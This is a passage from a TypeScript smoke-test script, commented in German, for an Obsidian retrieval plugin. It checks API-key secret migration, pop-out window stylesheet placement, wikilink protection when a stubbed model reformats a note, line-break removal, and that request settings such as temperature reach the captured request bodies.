          const posts = seen16().filter((x) => x.method === "POST");
          const want = `Bearer ${W16_KEY}`;
          record(W16_PUNKTE[2]!,
            gets.length > 0 && posts.length > 0 && gets.every((x) => x.auth === want) && posts.every((x) => x.auth === want),
            `Probe ${gets.length}× ${gets.every((x) => x.auth === want) ? "mit Bearer" : "OHNE Bearer"} · embed ${posts.length}× ${posts.every((x) => x.auth === want) ? "mit Bearer" : "OHNE Bearer"}`);

          stub16.loescheMitschnitt();
          await main.evaluate(`
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            const raw = p.settings.embeddingEndpoints[0];
            // Gegenprobe: dieselben zwei Anfragen aus der NICHT hydrierten Zeile (nur secretId, kein Schlüssel) tragen keinen Bearer.
            const h = raw.apiKey ? { Authorization: "Bearer " + raw.apiKey } : {};
            await fetch(raw.url + "/v1/models", { headers: h });
            await fetch(raw.url + "/v1/embeddings", { method: "POST", headers: { "Content-Type": "application/json", ...h }, body: JSON.stringify({ model: raw.model, input: ["probe"] }) });
            return true;
          `);
          record(W16_PUNKTE[3]!, seen16().length >= 2 && seen16().every((x) => x.auth === undefined),
            `${seen16().length} Anfragen aus der nicht hydrierten Zeile · Bearer ${seen16().every((x) => x.auth === undefined) ? "keiner (richtig)" : "VORHANDEN (Gegenprobe taugt nicht)"}`);

          // Mit Manager: weder Kit-Resolver noch Listen-UI migrieren dann.
          if (!(await setPlain())) {
            unmeasured(W16_PUNKTE[4]!, "Klartext-Zustand nicht herstellbar");
          } else {
            // Ein Manager ohne Endpunkte: er ist installiert (die Migration darf deshalb nicht ausfallen), liefert aber nichts.
            await installFakeManager(main, { pluginId: MGR, endpunkte: [] });
            const rm = await reload();
            record(W16_PUNKTE[4]!, rm.leakEmb === false && rm.leakChat === false && !!rm.embSecret && !!rm.chatSecret,
              `Leck Embedding=${String(rm.leakEmb)} Chat=${String(rm.leakChat)} · secretId Embedding=${String(rm.embSecret)} Chat=${String(rm.chatSecret)}`);
          }
        }
      } finally {
        await entferneFakeManager(main, { pluginId: MGR });
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          for (const l of [p.settings.embeddingEndpoints, p.settings.chatEndpoints]) {
            for (const cur of l) if (cur && cur.secretId) app.secretStorage.setSecret(cur.secretId, "");
          }
          p.settings.embeddingEndpoints = ${JSON.stringify(saved16.emb)};
          p.settings.chatEndpoints = ${JSON.stringify(saved16.chat)};
          await p.saveSettings();
          p.llm.invalidate();
          await p.resolveAndReconnectChat();
          await p.resolveAndReconnectEmbedder();
          return true;
        `);
        await stub16.stop();
      }
    }


    // Die Sektionen 7f bis 8 laufen nur im vollen Lauf.
    nachlauf: {
    if (nur) break nachlauf;
    // --- 7f. Index-Ordner ausblenden: Ziel ist das Hauptfenster, auch mit Pop-out ---------------
    // Kit `folder-hide` (Welle 11). Die alte Bauart hing das Blatt an `activeDocument`; steht beim
    // Laden ein Pop-out im Vordergrund, landet es dort statt beim Explorer (slide-deck 0.4.0 lud so
    // gar nicht mehr). Der Punkt stellt genau diese Lage her: Pop-out öffnen, Plugin neu laden,
    // nachsehen, WO das Blatt hängt. Vorbedingung, sonst „nichts gemessen“: `activeDocument` ist
    // während der Messung tatsächlich das Pop-out — sonst unterschiede der Punkt beide Bauarten nicht.
    const popSaved = await main.evaluate<boolean>(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      const was = p.settings.hideIndexFolder;
      p.settings.hideIndexFolder = true; await p.saveSettings();
      return was;
    `);
    try {
      await main.evaluate(`
        window.__vrPop = app.workspace.openPopoutLeaf();
        await new Promise(r => setTimeout(r, 1500));
        const w = window.__vrPop.view.containerEl.ownerDocument.defaultView;
        w.focus();
        await new Promise(r => setTimeout(r, 500));
      `);
      const popMeta = await main.evaluate<{ popIsActive: boolean; popIsOther: boolean }>(`
        const popDoc = window.__vrPop.view.containerEl.ownerDocument;
        return { popIsOther: popDoc !== app.workspace.rootSplit.doc, popIsActive: activeDocument === popDoc };
      `);
      await main.evaluate(`
        await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
        await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
      `);
      await pollUntil(main, `return !!app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]?.api?.status().indexed;`, 30_000, 500).catch(() => false);
      const where = await main.evaluate<{ root: number; pop: number }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const needle = 'data-path=' + JSON.stringify(p.settings.indexDir);
        const count = (d) => d.adoptedStyleSheets.filter(sh => [...sh.cssRules].some(r => r.cssText.includes(needle))).length;
        const popDoc = window.__vrPop.view.containerEl.ownerDocument;
        return { root: count(app.workspace.rootSplit.doc), pop: count(popDoc) };
      `);
      if (!popMeta.popIsOther || !popMeta.popIsActive) {
        unmeasured(POPOUT_PUNKT, `Vorbedingung fehlt (Pop-out ≠ Hauptfenster: ${popMeta.popIsOther}, Pop-out ist activeDocument: ${popMeta.popIsActive}) — nichts gemessen`);
      } else {
        record(POPOUT_PUNKT, where.root === 1 && where.pop === 0,
          `activeDocument war das Pop-out · Blatt im Hauptfenster: ${where.root} · im Pop-out: ${where.pop}`);
      }
    } finally {
      await main.evaluate(`
        try { window.__vrPop?.detach(); } catch {}
        delete window.__vrPop;
        // Das Blatt zu loesen laesst bei einem leeren Fenster ein „Neuer Tab"-Pop-out stehen,
        // das die naechste Sitzung aus workspace.json wiederherstellt (Welle 14).
        for (const w of [...(app.workspace.floatingSplit?.children ?? [])]) { try { w.win?.close(); } catch {} }
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.hideIndexFolder = ${JSON.stringify(popSaved)}; await p.saveSettings(); p.refreshIndexFolderHiding();
      `).catch(() => { console.log("  ! Pop-out/hideIndexFolder konnten nicht zurückgesetzt werden"); });
    }

    // --- 7g. Umformulieren: Wikilink-Schutz (Welle 14) -----------------------------------------
    // Zwei Haelften, und nur die zweite ist die Sicherung: zum Modell gehen statt Links/Code nur
    // Platzhalter (Quote), und ein Ergebnis mit anderen Links sperrt „Anwenden“ (Zaehlung).
    // Das Modell ist ein Stub auf `chatClient.stream` — ein echtes Modell zerstoert Links nicht
    // auf Bestellung. Gegenprobe: dasselbe mit unveraendertem Ergebnis laesst Anwenden frei.
    // Die Probe-Notiz wird angelegt und im finally geloescht, der Smoke veraendert keine Notiz.
    {
      // 7f schliesst Fenster und holt das Hauptfenster nicht zurueck. Ist es danach verdeckt,
      // feuern die Timer im Renderer nicht mehr, und ein `await setTimeout` in der Probe haengt
      // ueber die 30-s-Frist der Bruecke (Welle 14: drei von sechs Laeufen).
      const visVor = await main.evaluate<string>(`return document.visibilityState;`).catch(() => "unbekannt");
      if (visVor !== "visible") console.log(`  (vor 7g: visibilityState=${visVor} — hole das Fenster nach vorn)`);
      await requireVisible(main);
      const W14_NOTE = "w14-link-probe.md";
      const W14_TEXT = "Siehe [[Notes/Semantic search|Suche]] und `[[im Code]]` sowie ![[bild.png]] zum Vergleich.";
      type LinkProbe = { started: boolean; sentUser: string; applyDisabled: boolean | null; status: string; result: string; diag?: unknown };
      // Ein Timeout in der Bruecke nennt den Schritt nicht — hier wird er beschriftet.
      const schritt = async <T,>(label: string, fn: () => Promise<T>): Promise<T> => {
        try { return await fn(); } catch (e) { console.log(`  ! 7g ${label}: ${String(e)}`); throw e; }
      };
      const linkProbe = async (mode: "keep" | "destroy"): Promise<LinkProbe> => {
        // Aufbau in kleinen, beschrifteten Schritten: haengt einer, nennt die Meldung ihn — ein
        // einziger langer evaluate sagte nur „Zeitueberschreitung" (Welle 14, intermittierend).
        await schritt(`${mode}: Notiz anlegen`, () => main.evaluate(`
          let f = app.vault.getAbstractFileByPath(${JSON.stringify(W14_NOTE)});
          if (!f) f = await app.vault.create(${JSON.stringify(W14_NOTE)}, ${JSON.stringify(W14_TEXT)} + "\\n");
          return !!f;
        `));
        const geoeffnet = await schritt(`${mode}: Notiz oeffnen und Auswahl setzen`, () => main.evaluate<boolean>(`
          const f = app.vault.getAbstractFileByPath(${JSON.stringify(W14_NOTE)});
          // Neuer Tab im HAUPTfenster statt getLeaf(false): nach 7f kann das aktive Blatt in
          // einem geschlossenen Pop-out haengen, und openFile kehrt dann nie zurueck.
          const leaf = app.workspace.getLeaf("tab");
          window.__w14Leaf = leaf;
          await leaf.openFile(f, { state: { mode: "source" } });
          app.workspace.setActiveLeaf(leaf, { focus: true });
          await new Promise(r => setTimeout(r, 600));
          const ed = app.workspace.activeEditor?.editor;
          if (!ed) return false;
          ed.setSelection({ line: 0, ch: 0 }, { line: 0, ch: ed.getLine(0).length });
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.captureSelection();
          // Das Panel zieht seinen Zustand im Normalbetrieb ueber das entprellte selectionchange
          // nach; ein per API gesetzter Bereich loest das nicht zuverlaessig aus, der Knopf
          // bliebe gesperrt und der Klick liefe ins Leere (Welle 14).
          p.reformatPanel?.refresh();
          return true;
        `));
        await schritt(`${mode}: Stub setzen`, () => main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          window.__w14Sent = null;
          window.__w14OwnStream = Object.prototype.hasOwnProperty.call(p.chatClient, "stream") ? p.chatClient.stream : null;
          p.chatClient.stream = async (messages, onToken) => {
            window.__w14Sent = messages[1].content;
            // Stub: gibt die Platzhalter-Fassung zurueck; im Modus destroy faellt der ERSTE
            // Platzhalter im Text weg (im Probetext der Link) und ein kaputter steht dort.
            let out = messages[1].content;
            if (${JSON.stringify(mode)} === "destroy") out = out.replace(/ZQX\\d+QXZ/, "[Suche]");
            onToken(out);
            return { content: out, finishReason: "stop" };
          };
          return true;
        `));
        const started = geoeffnet && await schritt(`${mode}: Panel oeffnen und Knopf klicken`, () => main.evaluate<boolean>(`
          app.commands.executeCommandById("vault-retrieval:open-reformat");
          await new Promise(r => setTimeout(r, 800));
          const nodes = [...document.querySelectorAll(".vault-rag-reformat-group-title, .vault-rag-reformat-btn")];
          let titles = 0; const llm = [];
          for (const n of nodes) {
            if (n.classList.contains("vault-rag-reformat-group-title")) { titles++; continue; }
            if (titles === 2 && !n.closest(".vault-rag-reformat-freetext")) llm.push(n);
          }
          // Die Panel-Knoepfe sperrt das disabled-Attribut, nicht die Klasse is-disabled.
          const usable = llm.filter(b => !b.disabled);
          if (!usable.length) return false;
          usable[0].click();
          return true;
        `));
        if (!started) return { started, sentUser: "", applyDisabled: null, status: "", result: "" };
        await schritt(`${mode}: Warten auf den Stub`, () => pollUntil(main, `return window.__w14Sent !== null;`, 20_000, 250)).catch(() => false);
        await new Promise(r => setTimeout(r, 600));
        const read = await schritt(`${mode}: Lesen`, () => main.evaluate<{ applyDisabled: boolean | null; status: string; result: string; sentUser: string; diag: unknown }>(`
          const res = document.querySelector(".vault-rag-reformat-result");
          const modal = res && res.closest(".modal");
          const apply = modal ? [...modal.querySelectorAll("button")].find(b => b.classList.contains("mod-cta")) : null;
          return {
            applyDisabled: apply ? !!apply.disabled : null,
            status: modal?.querySelector(".okit-stream-status")?.textContent ?? "",
            result: res?.textContent ?? "",
            sentUser: window.__w14Sent ?? "",
            diag: {
              notices: [...document.querySelectorAll(".notice")].map(n => (n.textContent || "").slice(0, 80)),
              btns: [...document.querySelectorAll(".vault-rag-reformat-btn")].map(b => (b.textContent || "").trim() + (b.classList.contains("is-disabled") ? " [gesperrt]" : "")),
              modal: !!modal,
            },
          };
        `));
        // Aufraeumen: Vorschau im EIGENEN Modal verwerfen, Stub weg, Probe-Notiz loeschen.
        await main.evaluate(`
          const marker = document.querySelector(".vault-rag-reformat-original, .vault-rag-reformat-result");
          const eigenes = marker && marker.closest(".modal");
          const discard = eigenes ? [...eigenes.querySelectorAll("button")].find(b => /verwerf|discard/i.test(b.textContent || "")) : null;
          if (discard) discard.click();
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          if (window.__w14OwnStream) p.chatClient.stream = window.__w14OwnStream; else delete p.chatClient.stream;
          delete window.__w14OwnStream; delete window.__w14Sent;
          try { window.__w14Leaf?.detach(); } catch {} delete window.__w14Leaf;
        `).catch(() => console.log("  ! Reformat-Stub konnte nicht entfernt werden"));
        return { started, ...read };
      };
      try {
        const destroyed = await linkProbe("destroy");
        const kept = await linkProbe("keep");
        const prefix = W["reformatPreview.linksChanged"].split("{0}")[0] ?? "";
        if (!destroyed.started || !kept.started) {
          unmeasured(PUNKT_TREU, "Probe-Notiz/Auswahl nicht herstellbar — nichts gemessen");
          unmeasured(PUNKT_SPERRE, "Probe-Notiz/Auswahl nicht herstellbar — nichts gemessen");
        } else {
          const nurPlatzhalter = !kept.sentUser.includes("[[") && !kept.sentUser.includes("`") && /ZQX\d+QXZ/.test(kept.sentUser);
          const linkWieder = kept.result.includes("[[Notes/Semantic search|Suche]]") && kept.result.includes("`[[im Code]]`") && kept.result.includes("![[bild.png]]");
          record(PUNKT_TREU, nurPlatzhalter && linkWieder && kept.applyDisabled === false && kept.status === "",
            `Platzhalter gesendet: ${nurPlatzhalter} · Links im Ergebnis wieder da: ${linkWieder} · Anwenden gesperrt: ${kept.applyDisabled} · Status: „${kept.status}“` + (nurPlatzhalter && linkWieder ? "" : ` · ${JSON.stringify(kept.diag)}`));
          record(PUNKT_SPERRE, destroyed.applyDisabled === true && destroyed.status.startsWith(prefix) && prefix.length > 0,
            `Anwenden gesperrt: ${destroyed.applyDisabled} · Status: „${destroyed.status.slice(0, 90)}“`);
        }
      } finally {
        await main.evaluate(`
          const f = app.vault.getAbstractFileByPath(${JSON.stringify(W14_NOTE)});
          if (f) await app.vault.delete(f);
        `).catch(() => console.log(`  ! ${W14_NOTE} konnte nicht gelöscht werden`));
      }
    }

    // --- 7h. Umformulieren: „Absatz-Umbrüche entfernen“ (Welle 14) -----------------------------
    // Mechanisch und ohne Modell: der Knopf in der Gruppe „Sofort · offline“ ersetzt sofort.
    // Gemessen wird am Editor-Inhalt, ob der Absatz zusammengezogen ist UND die Zeilen im
    // Codeblock stehen geblieben sind — die Regel-Fassung der Vorlage (Regex ohne Zustand)
    // zog genau diese Zeilen zusammen. Probe-Notiz wie in 7g: angelegt, im finally geloescht.
    {
      const W14_NOTE2 = "w14-breaks-probe.md";
      const W14_VORHER = "Erste Zeile\nzweite Zeile\ndritte Zeile\n\n```\ncode a\ncode b\n```\n";
      const W14_NACHHER = "Erste Zeile zweite Zeile dritte Zeile\n\n```\ncode a\ncode b\n```\n";
      try {
        const res = await main.evaluate<{ started: boolean; after: string; notices?: string[] }>(`
          let f = app.vault.getAbstractFileByPath(${JSON.stringify(W14_NOTE2)});
          if (!f) f = await app.vault.create(${JSON.stringify(W14_NOTE2)}, ${JSON.stringify(W14_VORHER)});
          const leaf = app.workspace.getLeaf("tab");
          window.__w14Leaf = leaf;
          await leaf.openFile(f, { state: { mode: "source" } });
          app.workspace.setActiveLeaf(leaf, { focus: true });
          await new Promise(r => setTimeout(r, 600));
          const ed = app.workspace.activeEditor?.editor;
          if (!ed) return { started: false, after: "" };
          const last = ed.lastLine();
          ed.setSelection({ line: 0, ch: 0 }, { line: last, ch: ed.getLine(last).length });
          const pl = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          pl.captureSelection();
          pl.reformatPanel?.refresh();
          await app.commands.executeCommandById("vault-retrieval:open-reformat");
          await new Promise(r => setTimeout(r, 800));
          const btn = [...document.querySelectorAll(".vault-rag-reformat-btn")]
            .find(b => (b.textContent || "").trim() === ${JSON.stringify(W["transform.removeLineBreaks"])});
          if (!btn || btn.disabled) return { started: false, after: "" };
          btn.click();
          await new Promise(r => setTimeout(r, 600));
          return { started: true, after: ed.getValue(), notices: [...document.querySelectorAll(".notice")].map(n => (n.textContent || "").slice(0, 80)) };
        `);
        if (!res.started) unmeasured(PUNKT_UMBRUCH, "Knopf oder Auswahl nicht herstellbar — nichts gemessen");
        else record(PUNKT_UMBRUCH, res.after === W14_NACHHER, `Notiz danach: ${JSON.stringify(res.after)}` + (res.after === W14_NACHHER ? "" : ` · Notices: ${JSON.stringify(res.notices)}`));
      } finally {
        await main.evaluate(`
          try { window.__w14Leaf?.detach(); } catch {} delete window.__w14Leaf;
          const f = app.vault.getAbstractFileByPath(${JSON.stringify(W14_NOTE2)});
          if (f) await app.vault.delete(f);
        `).catch(() => console.log(`  ! ${W14_NOTE2} konnte nicht gelöscht werden`));
      }
    }

    // --- 7i. Anfrage-Profile (Welle 14) ---------------------------------------------------------
    // Die Werte, die das Plugin sendet, kommen aus der Kit-Tabelle `sampling-profiles`; dieser
    // Abschnitt prueft die VERDRAHTUNG am laufenden Plugin: dass der Einstellungs-Abschnitt
    // „Anfrage“ aufklappt und nach einer Bearbeitung OFFEN bleibt (Screenshot-Fund des Pilots
    // lingotuner: der Smoke sah ihn nicht, weil kein Punkt zwei Edits nacheinander fuhr), dass der
    // Chat-Knopf und die Stufenwahl die Einstellung schreiben, und — der eigentliche Beleg — dass
    // der gesendete Body die Modus-Temperatur traegt. Den Body greift ein Haken auf
    // XMLHttpRequest.prototype.send ab und bricht die Anfrage ab: kein Modell wird geladen.
    {
      // Der Abschnitt „Anfrage“ kommt seit Welle 15 vom Kit (`llm.renderSettings`): Titel, Kopfzeile und
      // Modus-Überschriften stammen aus SEINEM Wortschatz in der Sprache der Oberfläche.
      const KR = (uiLang.startsWith("de") ? LLM_CONNECTION_STRINGS_DE : LLM_CONNECTION_STRINGS_EN).request;
      const title = KR.title;
      let st: Cdp | null = null;
      try {
        await requireVisible(main);
        await openSettings(main);
        st = await attachTo("settings", port, vault);
        if (!st) throw new Error("kein Einstellungen-Fenster");
        // Den Abschnitt aufklappen und den Zustand aus dem DOM lesen, nicht aus dem Plugin.
        const readSection = async (): Promise<{ found: boolean; open: boolean; text: string; modes: number }> => st!.evaluate(`
          const sec = [...document.querySelectorAll(".okit-collapsible")].find(s => (s.querySelector(".okit-collapsible-header")?.textContent || "").includes(${JSON.stringify(title)}));
          if (!sec) return { found: false, open: false, text: "", modes: 0 };
          return { found: true, open: !sec.classList.contains("is-collapsed"), text: sec.textContent || "", modes: sec.querySelectorAll(".setting-item-heading").length };
        `);
        await st.send("Page.bringToFront");
        await st.evaluate(`
          const sec = [...document.querySelectorAll(".okit-collapsible")].find(s => (s.querySelector(".okit-collapsible-header")?.textContent || "").includes(${JSON.stringify(title)}));
          if (sec && sec.classList.contains("is-collapsed")) sec.querySelector(".okit-collapsible-header").click();
          await new Promise(r => setTimeout(r, 500));
          return true;
        `);
        const n1 = await readSection();
        const headPrefix = KR.head("\u0001", "", "", "").split("\u0001")[0] ?? "";
        const modeNames = (["grounded", "structured", "transform"] as const).map((m) => KR.modeHeading(m));
        record(W7I.n1, n1.found && n1.open && n1.text.includes(headPrefix) && modeNames.every((m) => n1.text.includes(m)),
          `gefunden: ${n1.found} · offen: ${n1.open} · Kopfzeile: ${n1.text.includes(headPrefix)} · Modi: ${modeNames.filter((m) => n1.text.includes(m)).join(", ")}`);

        // N2: Temperatur im ERSTEN Modus (grounded) setzen, dann zuruecksetzen.
        const setOverride = await st.evaluate<boolean>(`
          const sec = [...document.querySelectorAll(".okit-collapsible")].find(s => (s.querySelector(".okit-collapsible-header")?.textContent || "").includes(${JSON.stringify(title)}));
          const input = sec?.querySelector('input[data-field="temperature"]');
          if (!input || input.disabled) return false;
          input.value = "0.9";
          input.dispatchEvent(new Event("blur"));
          await new Promise(r => setTimeout(r, 900));
          return true;
        `);
        const afterSet = await main.evaluate<{ overrides: unknown; family: string | null }>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          return { overrides: p.settings.request.overrides.grounded ?? null, family: p.llm.source().family };
        `);
        const n2a = await readSection();
        const gesetzt = JSON.stringify(afterSet.overrides).includes('"temperature":0.9');
        await st.evaluate(`
          const sec = [...document.querySelectorAll(".okit-collapsible")].find(s => (s.querySelector(".okit-collapsible-header")?.textContent || "").includes(${JSON.stringify(title)}));
          const row = sec?.querySelector('input[data-field="temperature"]')?.closest(".setting-item");
          const btn = row?.querySelector(".extra-setting-button, .clickable-icon");
          if (btn) btn.click();
          await new Promise(r => setTimeout(r, 900));
          return !!btn;
        `);
        const afterReset = await main.evaluate<unknown>(`
          return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.request.overrides.grounded ?? null;
        `);
        const n2b = await readSection();
        record(W7I.n2, setOverride && gesetzt && n2a.open && afterReset === null && n2b.open,
          `gesetzt: ${gesetzt} (Familie ${String(afterSet.family)}) · nach dem Setzen offen: ${n2a.open} · nach dem Zurücksetzen gelöscht: ${afterReset === null} · offen: ${n2b.open}`);
      } catch (e) {
        unmeasured(W7I.n1, `Einstellungen nicht erreichbar: ${String(e)} — nichts gemessen`);
        unmeasured(W7I.n2, `Einstellungen nicht erreichbar: ${String(e)} — nichts gemessen`);
      } finally {
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          const r = structuredClone(p.settings.request); delete r.overrides.grounded; p.settings.request = r;
          await p.saveSettings(); app.setting.close(); return true;
        `).catch(() => console.log("  ! Anfrage-Überschreibung konnte nicht zurückgesetzt werden"));
        st?.close();
      }

      // N3 + N4: Chat-Knopf und Stufenwahl.
      const chatDom = `
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        await p.openHub("chat"); await new Promise(r => setTimeout(r, 600));`;
      try {
        const saved = await main.evaluate<unknown>(`return structuredClone(app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.request);`);
        const readKnopf = `
          const k = document.querySelector(".vault-rag-chat-root .okit-thinking-toggle");
          const pl = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          return k ? { pressed: k.getAttribute("aria-pressed"), text: k.textContent, stored: pl.settings.request.thinking.grounded ?? null } : null;`;
        const v0 = await main.evaluate<{ pressed: string; text: string; stored: string | null } | null>(`${chatDom} ${readKnopf}`);
        await main.evaluate(`document.querySelector(".vault-rag-chat-root .okit-thinking-toggle")?.click(); await new Promise(r => setTimeout(r, 500)); return true;`);
        const v1 = await main.evaluate<{ pressed: string; text: string; stored: string | null } | null>(readKnopf);
        await main.evaluate(`document.querySelector(".vault-rag-chat-root .okit-thinking-toggle")?.click(); await new Promise(r => setTimeout(r, 500)); return true;`);
        const v2 = await main.evaluate<{ pressed: string; text: string; stored: string | null } | null>(readKnopf);
        const umgeschaltet = !!v0 && !!v1 && !!v2 && v0.pressed !== v1.pressed && v2.pressed === v0.pressed
          && v0.text !== v1.text && v1.stored !== v0.stored;
        record(W7I.n3, umgeschaltet,
          `Start ${v0?.pressed}/„${v0?.text}“/${String(v0?.stored)} → ${v1?.pressed}/„${v1?.text}“/${String(v1?.stored)} → zurück ${v2?.pressed}`);

        // N4: Stufenwahl einschalten (die Einstellung, nicht der Knopf), Tab neu zeigen, Dropdown waehlen.
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          await p.saveRequestSettings({ ...structuredClone(p.settings.request), levelPickerInChat: true });
          await p.openHub("related"); await new Promise(r => setTimeout(r, 300));
          await p.openHub("chat"); await new Promise(r => setTimeout(r, 600));
          return true;`);
        const n4 = await main.evaluate<{ hasSelect: boolean; buttonGone: boolean; stored: string | null }>(`
          const sel = document.querySelector(".vault-rag-chat-root .okit-thinking-control select");
          if (sel) { sel.value = "high"; sel.dispatchEvent(new Event("change")); }
          await new Promise(r => setTimeout(r, 600));
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          return { hasSelect: !!sel, buttonGone: !document.querySelector(".vault-rag-chat-root .okit-thinking-toggle"), stored: p.settings.request.thinking.grounded ?? null };`);
        record(W7I.n4, n4.hasSelect && n4.buttonGone && n4.stored === "high",
          `Dropdown: ${n4.hasSelect} · Knopf weg: ${n4.buttonGone} · gespeichert: ${String(n4.stored)}`);
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          await p.saveRequestSettings(${JSON.stringify(saved)}); return true;`);
      } catch (e) {
        unmeasured(W7I.n3, `Chat-Panel nicht erreichbar: ${String(e)} — nichts gemessen`);
        unmeasured(W7I.n4, `Chat-Panel nicht erreichbar: ${String(e)} — nichts gemessen`);
      }

      // Gesendeter Body. Haken auf XMLHttpRequest.prototype.send: die Anfrage wird gelesen und
      // abgebrochen. `window.__w14Bodies` haelt die Bodies; im finally wird der Haken entfernt.
      try {
        await main.evaluate(`
          window.__w14Bodies = [];
          window.__w14Send = XMLHttpRequest.prototype.send;
          XMLHttpRequest.prototype.send = function (body) {
            try {
              const j = JSON.parse(String(body));
              if (j && Array.isArray(j.messages)) { window.__w14Bodies.push(j); this.abort(); return; }
            } catch {}
            return window.__w14Send.apply(this, arguments);
          };
          return true;`);
        // Chat ueber die Oberflaeche.
        await main.evaluate(`
          ${chatDom}
          const ta = document.querySelector(".vault-rag-chat-input");
          document.querySelector(".vault-rag-chat-new")?.click();
          ta.value = "Antworte mit einem Wort.";
          ta.dispatchEvent(new Event("input", { bubbles: true }));
          document.querySelector(".vault-rag-chat-send").click();
          return true;`);
        await pollUntil(main, `return window.__w14Bodies.length >= 1;`, 20_000, 250).catch(() => false);
        const chatBody = await main.evaluate<Record<string, unknown> | null>(`return window.__w14Bodies[0] ?? null;`);
        record(W7I.chat, chatBody !== null && chatBody.temperature === 0.4,
          chatBody ? `temperature=${String(chatBody.temperature)} · Felder: ${Object.keys(chatBody).filter((k) => k !== "messages" && k !== "stream").join(", ")}` : "kein Body abgegriffen");
        await main.evaluate(`document.querySelector(".vault-rag-chat-new")?.click(); return true;`);

        // Umformatieren ueber den Panel-Knopf (wie 7g), Probe-Notiz im eigenen Tab.
        const before = await main.evaluate<number>(`return window.__w14Bodies.length;`);
        const started = await main.evaluate<boolean>(`
          let f = app.vault.getAbstractFileByPath("w14-body-probe.md");
          if (!f) f = await app.vault.create("w14-body-probe.md", "Ein kurzer Satz zum Umformen.\\n");
          const leaf = app.workspace.getLeaf("tab"); window.__w14Leaf = leaf;
          await leaf.openFile(f, { state: { mode: "source" } });
          app.workspace.setActiveLeaf(leaf, { focus: true });
          await new Promise(r => setTimeout(r, 600));
          const ed = app.workspace.activeEditor?.editor; if (!ed) return false;
          ed.setSelection({ line: 0, ch: 0 }, { line: 0, ch: ed.getLine(0).length });
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.captureSelection(); p.reformatPanel?.refresh();
          app.commands.executeCommandById("vault-retrieval:open-reformat");
          await new Promise(r => setTimeout(r, 800));
          const nodes = [...document.querySelectorAll(".vault-rag-reformat-group-title, .vault-rag-reformat-btn")];
          let titles = 0; const llm = [];
          for (const n of nodes) {
            if (n.classList.contains("vault-rag-reformat-group-title")) { titles++; continue; }
            if (titles === 2 && !n.closest(".vault-rag-reformat-freetext")) llm.push(n);
          }
          const usable = llm.filter(b => !b.disabled);
          if (!usable.length) return false;
          usable[0].click();
          return true;`);
        if (!started) unmeasured(W7I.reformat, "Probe-Notiz/Auswahl nicht herstellbar — nichts gemessen");
        else {
          await pollUntil(main, `return window.__w14Bodies.length > ${before};`, 20_000, 250).catch(() => false);
          const rb = await main.evaluate<Record<string, unknown> | null>(`return window.__w14Bodies[${before}] ?? null;`);
          record(W7I.reformat, rb !== null && rb.temperature === 0.2 && typeof rb.max_tokens === "number" && (rb.max_tokens as number) >= 4096,
            rb ? `temperature=${String(rb.temperature)} · max_tokens=${String(rb.max_tokens)}` : "kein Body abgegriffen");
        }
        // Smart Apply: im Fixture aus — kurz einschalten (Plugin neu laden, das Panel entsteht beim
        // Laden), einen Lauf anstossen, den Body greifen, alles zurueckstellen. Gelingt der Aufbau
        // nicht, ist der Punkt „nichts gemessen“ (kein Skip ohne Grund).
        const smartBefore = await main.evaluate<number>(`return window.__w14Bodies.length;`);
        let smartBody: Record<string, unknown> | null = null;
        let smartWhy = "";
        try {
          await main.evaluate(`
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            window.__w14SmartWas = !!p.settings.smartApplyEnabled;
            p.settings.smartApplyEnabled = true; await p.saveSettings();
            await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
            await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
            return true;`);
          await pollUntil(main, `return !!app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]?.api?.status().indexed;`, 30_000, 500).catch(() => false);
          const ok = await main.evaluate<boolean>(`
            const f = app.vault.getMarkdownFiles().find(x => x.path.startsWith("Notes/") && x.stat.size > 200 && !x.path.startsWith("Notes/Integrator"));
            if (!f) return false;
            const leaf = app.workspace.getLeaf("tab"); window.__w14Leaf2 = leaf;
            await leaf.openFile(f, { state: { mode: "source" } });
            app.workspace.setActiveLeaf(leaf, { focus: true });
            await new Promise(r => setTimeout(r, 800));
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            await p.openHub("smart-apply");
            await new Promise(r => setTimeout(r, 2500));
            const run = document.querySelector(".vault-rag-sa-run");
            if (!run || run.disabled || run.classList.contains("is-disabled")) return false;
            run.click();
            return true;`);
          if (!ok) smartWhy = "Lauf-Knopf nicht bedienbar (keine Vorlage/Notiz im Fixture?)";
          else {
            await pollUntil(main, `return window.__w14Bodies.length > ${smartBefore};`, 25_000, 250).catch(() => false);
            smartBody = await main.evaluate<Record<string, unknown> | null>(`return window.__w14Bodies[${smartBefore}] ?? null;`);
            if (!smartBody) smartWhy = "kein Body in 25 s abgegriffen";
          }
        } catch (e) {
          smartWhy = String(e);
        } finally {
          await main.evaluate(`
            document.querySelector(".vault-rag-sa-stop")?.click();
            try { window.__w14Leaf2?.detach(); } catch {} delete window.__w14Leaf2;
